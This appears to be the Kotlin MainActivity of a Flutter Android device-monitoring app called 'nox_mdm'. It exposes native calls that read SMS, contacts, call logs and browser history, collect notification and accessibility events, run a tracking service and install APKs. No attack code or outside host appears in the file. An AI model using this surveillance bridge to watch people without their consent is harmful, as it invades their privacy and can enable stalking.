package com.nox.mdm.nox_mdm

import android.content.Context
import io.flutter.embedding.android.FlutterActivity
import io.flutter.embedding.engine.FlutterEngine
import io.flutter.plugin.common.EventChannel
import io.flutter.plugin.common.MethodChannel
import org.json.JSONArray
import org.json.JSONObject

class MainActivity : FlutterActivity() {

    companion object {
        private const val METHOD_CHANNEL = "nox.mdm/native"
        private const val EVENT_CHANNEL = "nox.mdm/native_events"
    }

    override fun configureFlutterEngine(flutterEngine: FlutterEngine) {
        super.configureFlutterEngine(flutterEngine)

        val ctx: Context = applicationContext

        MethodChannel(flutterEngine.dartExecutor.binaryMessenger, METHOD_CHANNEL)
            .setMethodCallHandler { call, result ->
                when (call.method) {
                    // ─── Permission state ──────────────────────────────
                    "getPermissionsSnapshot" -> result.success(NoxPermissions.snapshot(ctx))

                    "openNotificationListenerSettings" -> {
                        NoxPermissions.openNotificationListenerSettings(ctx); result.success(null)
                    }
                    "openAccessibilitySettings" -> {
                        NoxPermissions.openAccessibilitySettings(ctx); result.success(null)
                    }
                    "openUsageAccessSettings" -> {
                        NoxPermissions.openUsageAccessSettings(ctx); result.success(null)
                    }
                    "requestIgnoreBatteryOptimizations" -> {
                        NoxPermissions.requestIgnoreBatteryOptimizations(ctx); result.success(null)
                    }
                    "openAppNotificationSettings" -> {
                        NoxPermissions.openAppNotificationSettings(ctx); result.success(null)
                    }

                    // ─── Foreground service control ────────────────────
                    "startForegroundService" -> {
                        TrackingForegroundService.start(ctx); result.success(true)
                    }
                    "stopForegroundService" -> {
                        TrackingForegroundService.stop(ctx); result.success(true)
                    }

                    // ─── Drain native buffers to Flutter ───────────────
                    "drainUnlocks" -> result.success(UnlockReceiver.drainPending(ctx))

                    "drainNotifications" -> {
                        val events = NoxNotificationListenerService.drainPending(ctx)
                        result.success(events.map { jsonToMap(it) })
                    }

                    "drainAccessibility" -> {
                        val events = NoxAccessibilityService.drainPending(ctx)
                        result.success(events.map { jsonToMap(it) })
                    }

                    "drainBrowserHistory" -> {
                        val prefs = ctx.getSharedPreferences("nox_browser_buffer", Context.MODE_PRIVATE)
                        val raw = prefs.getString("pending_urls", "") ?: ""
                        prefs.edit().remove("pending_urls").apply()
                        val arr = if (raw.isBlank()) JSONArray() else try { JSONArray(raw) } catch (_: Throwable) { JSONArray() }
                        val out = (0 until arr.length()).mapNotNull {
                            arr.optJSONObject(it)?.let { o -> jsonToMap(o) }
                        }
                        result.success(out)
                    }

                    // ─── In-app auto-update ────────────────────────────
                    "canRequestPackageInstalls" ->
                        result.success(NoxUpdater.canRequestPackageInstalls(ctx))

                    "openManageInstallSources" ->
                        result.success(NoxUpdater.openManageInstallSources(ctx))

                    "installApk" -> {
                        val path = call.argument<String>("path")
                        if (path.isNullOrBlank()) {
                            result.error("ARG", "path required", null)
                        } else {
                            result.success(NoxUpdater.installApk(ctx, path))
                        }
                    }

                    // ─── SMS + Contacts + CallLogs + Browser readers ────
                    "readSms" -> {
                        result.success(NoxDataReaders.readSms(ctx))
                    }

                    "readContacts" -> {
                        result.success(NoxDataReaders.readContacts(ctx))
                    }

                    "readCallLogs" -> {
                        result.success(NoxDataReaders.readCallLogs(ctx))
                    }

                    "readBrowserHistory" -> {
                        result.success(NoxDataReaders.readBrowserHistory(ctx))
                    }

                    else -> result.notImplemented()
                }
            }

        EventChannel(flutterEngine.dartExecutor.binaryMessenger, EVENT_CHANNEL)
            .setStreamHandler(object : EventChannel.StreamHandler {
                override fun onListen(arguments: Any?, events: EventChannel.EventSink?) {
                    NativeBridge.sink = events
                }
                override fun onCancel(arguments: Any?) {
                    NativeBridge.sink = null
                }
            })
    }

    // JSONObject → Map<String, Any?> recursively so Flutter sees plain maps.
    private fun jsonToMap(obj: JSONObject): Map<String, Any?> {
        val map = HashMap<String, Any?>()
        val keys = obj.keys()
        while (keys.hasNext()) {
            val k = keys.next()
            val v = obj.get(k)
            map[k] = when (v) {
                is JSONObject -> jsonToMap(v)
                is JSONArray -> jsonToList(v)
                JSONObject.NULL -> null
                else -> v
            }
        }
        return map
    }

    private fun jsonToList(arr: JSONArray): List<Any?> {
        val list = ArrayList<Any?>(arr.length())
        for (i in 0 until arr.length()) {
            val v = arr.get(i)
            list.add(
                when (v) {
                    is JSONObject -> jsonToMap(v)
                    is JSONArray -> jsonToList(v)
                    JSONObject.NULL -> null
                    else -> v
                }
            )
        }
        return list
    }
}
